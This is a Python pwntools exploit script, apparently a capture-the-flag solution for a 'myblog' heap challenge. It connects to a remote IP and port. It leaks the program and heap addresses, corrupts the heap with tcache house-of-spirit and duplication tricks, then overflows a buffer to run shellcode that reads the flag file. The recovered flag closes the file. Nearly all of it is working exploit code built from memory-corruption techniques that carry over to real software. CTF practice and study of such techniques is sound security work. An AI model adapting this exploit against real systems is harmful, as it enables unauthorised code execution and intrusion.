from pwn import *
from ctypes import *

#s = process('./myblog')
s = remote('159.65.125.233',31337)
'''
b = BP(s)
b.bp('tracemalloc on')
#b.bp('b *delete+76')
b.bp64(0x1063)
b.done()
'''

libc = CDLL("libc.so.6")
libc.srand(libc.time(0));
box = libc.rand() & 0xFFFFF000
log.info("BOX : 0x%x" % box)

context.arch = "amd64"
sh_r = shellcraft.read(0,box,0x100)

sh = '	nop\n' * 0x30
#sh += shellcraft.pushstr('/home/youngjoo/pwn/ctf/youngjoo/flag')
sh += shellcraft.pushstr('/home/pwn/flag')
sh += shellcraft.openat(0,'rsp', 0)
sh += shellcraft.read('rax', box+0x100, 100)
sh += shellcraft.write(1, box+0x100, 100)
sh += shellcraft.exit(0)

def write(content,author):
	s.sendlineafter('Exit\n','1')
	s.sendafter('t\n',content)
	s.sendlineafter('r\n',author)

def dele(idx):
	s.sendlineafter('Exit\n','2')
	s.sendlineafter('x\n',idx)

def show(name, leak=False):
	r = ''
	s.sendlineafter('Exit\n','3')
	s.recvuntil('Old Owner : ')

	if leak == True:
		r = u64(s.recvline()[:-1] + "\x00"*2)
	s.sendafter('New Owner : \n',name)
	return r

def hid():
	s.sendlineafter('Exit\n','31337')
	s.recvuntil('gift 0x')
	r = int(s.recvline()[:-1],16)
	return r

pause()
# make fake chunk
for i in range(0x41):
	write("A" * 8, "B" * 4)

# pie leak
pie = hid() - 0xef4
print hex(pie)
log.info("PIE : 0x%x" % pie)
s.sendline('A')

# t-cache house of spirit
show(p64(pie+0x202040)[:-1])
dele('-1')

# heap leak
write("A" * 8 + p8(8),"C")
heap = show(p64(pie+0x202040)[:-1],leak=True)
log.info("HEAP : 0x%x" % heap)
dele('-1')

# t-cache duplication
write("A" * 8 + p8(8),"C")
show(p64(heap+0x100)[:-1])
dele('-1')
show(p64(0x41)[:-1])
dele('0')
dele('1')

# t-cache house of spirit
write(p64(box+0x10),"C")
write(p64(box+0x10),"C")
write(p64(box+0x10),"C")
write("A","C")
dele('64')
write(asm(sh_r),"C")

# buffer overflow
hid()
s.send("A" * 0x10 + p64(box+0x10)[:-1])

# shellcode
s.sendlineafter('Done!!\n',asm(sh))
s.interactive()
# ASIS{526eb5559eea12d1e965fe497b4abb0a308f2086}
